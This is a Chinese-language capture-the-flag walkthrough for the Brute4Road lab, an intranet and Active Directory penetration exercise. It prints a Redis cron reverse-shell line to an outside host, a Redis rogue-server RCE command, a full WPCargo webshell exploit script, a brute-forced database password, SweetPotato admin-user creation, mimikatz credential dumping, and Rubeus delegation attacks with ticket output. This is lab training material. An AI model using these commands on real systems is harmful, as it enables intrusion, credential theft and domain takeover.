# 春秋云境-Brute4Road综合渗透


春秋云境-Brute4Road综合渗透通关wp

<!--more-->

![image-20250218215044448](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218215044448.png?imageSlim)

靶标介绍：

Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。

## flag01

起手fscan

```bash
E:\Tools\web\fscan_1.8.4>fscan.exe -h 39.99.144.164

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.144.164:21 open
39.99.144.164:22 open
39.99.144.164:80 open
39.99.144.164:6379 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle http://39.99.144.164      code:200 len:4833   title:Welcome to CentOS
[+] ftp 39.99.144.164:21:anonymous
   [->]pub
[+] Redis 39.99.144.164:6379 unauthorized file:/usr/local/redis/db/dump.rdb
已完成 4/4
```

发现redis

[Redis系列漏洞总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/249238.html)

尝试写计划任务反弹shell，提示权限不够

```bash
set xz "\n* * * * * bash -i >& /dev/tcp/39.106.75.37/9999 0>&1\n"
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218132725-a2a9jgs.png?imageSlim)​

Redis 主从复制RCE

[n0b0dyCN/redis-rogue-server: Redis(&lt;=5.0.5) RCE](https://github.com/n0b0dyCN/redis-rogue-server)

（主从复制极有可能把靶机打崩，因此我们利用成功之后若是不小心退出了shell，只能重启环境。）

```bash
python3 redis-rogue-server.py --rhost 39.99.144.164 --lhost 39.106.75.37 --lport 6666
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140031-4bqdvmr.png?imageSlim)​

vps拿到shell之后创建一个伪终端

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140120-ulsazlf.png?imageSlim)​

找到flag，权限不够，尝试suid提权

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140227-pnpdhnv.png?imageSlim)​

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140330-802jcn6.png?imageSlim)​

发现base64可利用

```bash
base64 "/home/redis/flag/flag01" | base64 --decode
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218140501-g69g3ha.png?imageSlim)​

## flag02

搜集信息，ifconfig发现没有该命令

使用`netstat -antp`​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218141920-hao05gu.png?imageSlim)​

上传fscan frpc frpc.ini到靶机

```bash
[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24
./fscan -h 172.22.2.7/24

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.2.3      is alive
(icmp) Target 172.22.2.16     is alive
(icmp) Target 172.22.2.7      is alive
(icmp) Target 172.22.2.34     is alive
(icmp) Target 172.22.2.18     is alive
[*] Icmp alive hosts len is: 5
172.22.2.3:135 open
172.22.2.18:80 open
172.22.2.16:80 open
172.22.2.18:22 open
172.22.2.7:80 open
172.22.2.7:22 open
172.22.2.7:21 open
172.22.2.3:88 open
172.22.2.7:6379 open
172.22.2.16:1433 open
172.22.2.18:445 open
172.22.2.34:445 open
172.22.2.3:445 open
172.22.2.18:139 open
172.22.2.16:139 open
172.22.2.34:139 open
172.22.2.3:139 open
172.22.2.34:135 open
172.22.2.16:135 open
172.22.2.16:445 open
[*] alive ports len is: 20
start vulscan
[*] NetInfo 
[*]172.22.2.16
   [->]MSSQLSERVER
   [->]172.22.2.16
[*] NetBios 172.22.2.34     XIAORANG\CLIENT01         
[*] NetInfo 
[*]172.22.2.3
   [->]DC
   [->]172.22.2.3
[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found
[*] NetInfo 
[*]172.22.2.34
   [->]CLIENT01
   [->]172.22.2.34
[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
[*] OsInfo 172.22.2.16  (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02    
[*] OsInfo 172.22.2.3   (Windows Server 2016 Datacenter 14393)
[+] ftp 172.22.2.7:21:anonymous 
   [->]pub
[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
已完成 20/20
```

上frp转发流量

```bash
nohup ./frpc -c ./frpc.ini >/dev/null 2>&1 &
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218154015-hnoc9sk.png?imageSlim)​

发现有wordpress，用wpscan扫一下

```bash
wpscan --url http://172.22.2.18
```

发现版本过低

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155502-9kiqbw4.png?imageSlim)​

[WPCargo &lt; 6.9.0 – Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities](https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/)

直接打exp

```bash
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://172.22.2.18/'
cmd = 'ls'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.

requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.

print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))

```

蚁剑连接，类型要选cmdlinux

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218155801-q8m6goi.png?imageSlim)​

在config文件内发现数据库账号密码

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218160249-s5gvoy3.png?imageSlim)​

连一下数据库，拿到flag02

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162345-fy0qbz6.png?imageSlim)​

## flag03

有相关提示

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218162531-1upkiwc.png?imageSlim)​

发现内网还有个主机开启1433端口，导出过口令，尝试数据库爆破。

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218163459-ym2vlyn.png?imageSlim)​

使用MDUT连过去

```bash
sa/ElGNkOiC
```

上传SweetPotato提权

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204338-izyqetm.png?imageSlim)​

提权读取flag03

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218204445-hlh60gf.png?imageSlim)​

## flag04

发现3389端口是开着的

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218205211-er5cxb5.png?imageSlim)​

创建用户，rdp连过去

```bash
C:/迅雷下载/sweetpotato.exe -a "net user test qwer1234! /add"
C:/迅雷下载/sweetpotato.exe -a "net localgroup administrators test /add"
```

查看一下信息

```bash
systeminfo
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218211924-sflhh7n.png?imageSlim)​

使用BloodHound分析域关系

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218213937-1jo50vf.png?imageSlim)​

上传猕猴桃

```bash
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218210132-go7d6sk.png?imageSlim)​

拿到MSSQLSERVER$的NTML

```bash
f76585e4daca31b783b926e97e03439c
```

可以尝试委派攻击

上传Rubeus.exe

```bash
.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f76585e4daca31b783b926e97e03439c /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap > res.txt
```

```bash
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: 7e0afdd74f437da621b7b205a61781e1
[*] Building AS-REQ (w/ preauth) for: 'xiaorang.lab\MSSQLSERVER$'
[*] Using domain controller: 172.22.2.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3lkC6JQjHfRCcji5EMsY39Dv/i2//jnIfAkQSjQ1OHlel3r4Wh+lg/u7jAgirmDe18ZnnkVv0it5WM8dNAN6rTYBXP/AxGVuWQWU63EDmtmlXsDmSrSqILnJ+2MZUl2pwX69KQDRJOB5ewy7AW3sPI0JmmJjkVrD98D+UgEqw1XX2xzBiylC2PNPGnqkSm6FA+Itgj2s6KsGITu5uYP9E6dT0Tnv3MzeQMq19/0WoHmy7sNQxgTDLr3hM5za/hE2VxZfijuIA4mZYV+2Uk998xNPgDstAqA22dB5aEnvOYQyIL1cRGE9vJtlc9R0o97tedCTQlu+PyGwsoQsNVx+rbJrSL+CXA9SDPjaULYlJtTZn8PfWUUpWfyU/MjIPQb+l75+lnZmh0rxDRVmQjYJKTVARTmMz+YZ4rV9P+RUNTYBGvZkg65kCT7m4/EGKtNW9zTLAKF3rRX1lgqB9NlVhPCp4gBZxTvzxY+3li6g62NNmwduFFvSpcH4pN+Ra4dIUXF26VlBsxPFU9j0UIOl4UwojwEWQ9IP1gCzH0Xv8MwMsLjeSZhAYoMVObFisd7JSiG31jA4v90BD5JCcYq58xHcUSCf6/k/dvYV6wVMTUSfjrzeQ8Cb1vlxoORgaRNrKT8Jrv8AilqBLwJ/VMMrI5CI9gf4wbfHMObuVe0ekw6Ep2Ef/uBSlpN9kq9UEHNGitAsQzyeIIjxNX5bF+uFRV3j9zawgcEDSA62B+YiCDhe2Kh3cZgM7oDXoy9CPUuW1J2tSv6v6I6j/LMStZtXqnem8aLlSEHUL1p3NWP5CTtJTHlICfxihKcQQbJHtjMePimaSyWUq/gsleaDfty6s+Cv87Gg2ycaZEkep5tbzxz/BLMRzvq4weZdm4Iqee9kWt0uPhBPjDTw2qHLqdxOEhbSKS+wD6JNvN+xJJEe/g7cJL9ndstjKDxD6K6IvW1UMwsdGgn2Zx62Q2yvUG1M/cXpMkAYAVaAjNSkdO8lfgMKrOTU+bz6AM9u5GupaUrzII0tcOlN8gcYv7Pcwsw7F+4GWokEJ/NW5Y0jmcsn+Azi5w3V+VgPBw5FtHCEfoaU+EupxVUnqJSJbq3VrZK/NbV4AZXSY3gYwpqMc4cew5jYI1G1iL8aHiNxcVtdCwQ5wAQoDwJBkr/czCt3PVQaR6V1rSx9ds4hUG1FZHVBy8JVv0oFQQxsx22NB2Tb6aeaSsRQmHMSO94BAl5ChO492PwCQnR7vTzUcjI55zXcnmzEdKgN0I4HsjeTVq7gD4iELF2wJLABQSGJl+MyBms0yyyBXsVr6I6Ex06BUqADgCEX8JskIdlxyJuegtv2JT3gb98cZ0dut9e+ym5Y4w/CslV59lmrq/mX3I7Ki+uKbu1qcK94fSAnRjlLRUjranhKAheVGDVW2AjHbmvW8oN8rEPri3lJ4UGHtJH2WfuHnjcliz2773vyYFwbNhGtqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBA8maMBmJBiqwedjqcg2RbdoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMDcyNDA5NDEwN1qmERgPMjAyMzA3MjQxOTQxMDdapxEYDzIwMjMwNzMxMDk0MTA3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==


[*] Action: S4U

[*] Building S4U2self request for: 'MSSQLSERVER$@XIAORANG.LAB'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2self request to 172.22.2.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'MSSQLSERVER$@XIAORANG.LAB'
[*] base64(ticket.kirbi):

      doIF3DCCBdigAwIBBaEDAgEWooIE5DCCBOBhggTcMIIE2KADAgEFoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKOCBKQwggSgoAMCARKhAwIBAqKCBJIEggSOQk0zg8ppwwk/iV4OPzoKxGIrT5bV9o5LO9YdFQVcvQZM+P9/0ukplP962xywAP9iDmhLXdz8OEHMuCC0iUHXq4i9Axa9VKZkNbigEg1KyMcZMFADLpXm4aSTvjnHOLKryuH+ACFLL80Roj6JXP2Rx8cpxBaQFbrViV9PmzyXE0D6/B/DfPOII+ON+6aC5TCkjS841xGr6JIrZ1IVXMreSp6y3Sa0+Ac1Jk+j+XC2JqyBaCKInt5UArLHddcDD+Ac6VrZhJdcuDcw37SsiCAhwn3V/eML9XXbvam6cB++Xsx2D/mMIdH5nqhDPNzJx5iaJkaWkVWvcYlLhQmboyd6mKsHw7CuJ41G9dJh8kDSdEsg1T5ZOef+oelAO7zIHcAvKon9XS0UA9+I5uKWNMsUqUluAOW6VIQnhbe400NS7xbIoAfc6Os0ap1tUAtXWVNp6RGnUsFVmPpE2pwKddOuFV2c0D0wrk+m6yYop8SDeWLsOzgOT7NggwnVwpgXcqRtZN6oQYJppwKNILtg5t+H0gvdDiABHOdMTNoYTnJ5zFybmX02WuSgtOsVLhEnchBgybaGaO4XlYPk7XXeOntg0mA/4qoFB83N0zfkYDyvEFWvlsyiOS1xVTiUGS4HFnauxGmWztsIt9OoRt57XlsEuI64zXLq0/WU4neNb3l4cuTmnSdl/su4wbwDizJmI/MpOTI34nIFJE7ZXgcXnJtjomNpbZeBmo6Ok39+Iww2uIMmXDK3cLtPiRt2CjCHrmVx7OLkfIAsjRxm7bMx7C0X1lWsXcCPzMm9ksANEeWbxUxlqsCmChZfpFgtN0y6sy6ua/PyUBRT294m9elMvryN85CNSiInKVkUBWKojr6K/7/9c0JJPYJGCxfJWiYYrN5LPABtQfSGoq+yd9BEzrx9qPi4DfQ83ipkeIn+AioWa22+5sL7mJ2BOxNoZq0FLI01RbafSP1fVzAe6w1ovGivQH9w0pFh6UYZ8T29L2dYC3iVvCW2jazOPVYoDGR1A3+WE9xFG5EeDYPQRWcZHT/tTwAlxil3XijEwqWU2J1ghQt3tp/nHQEXaLiZFFI8c3PWQwSqjq/DIRVQk74KXevWCxvb79dLVwWhY+nRtpvYxkcHZmsXG4tOM2FkQ6h9WSUhHBn34KPTmXPh+YOzFfY/OSaAos9bLzt8jotlclLzELdqeQW67lH1Y2SMD49OjFvDHFaR+JHKQeIrtlJR0twKZyy0b0I01C9Pl3pwDjCvo860fHJrJ7t389uB/q/bmA4NdfYiOjHPWil1e5/FQuWi15dr8UuvoY7AC5sb91YsGcNfGIkKBqytby2WmIwLnpmWyBG8dQNmHu0mtzHtRwaYw7991ugNdyBKBflVUZFCsJL8PeXSEf8PIek12i8LDSMfmoetbkK8OSNwZIT3qdrGmV2FMxyuQtIOV3u1Sse5ocaeOoFVhCTzd0KWINCa4EI3Q21T5PrqHXJvKI6XXC1XHngFM23+MWDumrW4rChU2iy6YiCeatIY3O+8TDjmU7Jq7Hsu2amjVFtA4SfFN8mjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAapy7pXGfYcFykGPdMCIK9Nzoy1mifAVQovulRmOfh4KEOGwxYSUFPUkFORy5MQUKiGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoQAApREYDzIwMjMwNzI0MDk0MTEwWqYRGA8yMDIzMDcyNDE5NDEwN1qnERgPMjAyMzA3MzEwOTQxMDdaqA4bDFhJQU9SQU5HLkxBQqkZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJA==

[*] Impersonating user 'Administrator' to target SPN 'ldap/DC.xiaorang.lab'
[*] Building S4U2proxy request for service: 'ldap/DC.xiaorang.lab'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2proxy request to domain controller 172.22.2.3:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'ldap/DC.xiaorang.lab':

      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
[+] Ticket successfully imported!
```

然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 CIFS 服务的票据，并将得到的票据传递到内存中

```bash
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:上面抓到的服务票据
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250218214124-6j41qhv.png?imageSlim)​

随后可读flag04

```bash
type \DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
```

‍

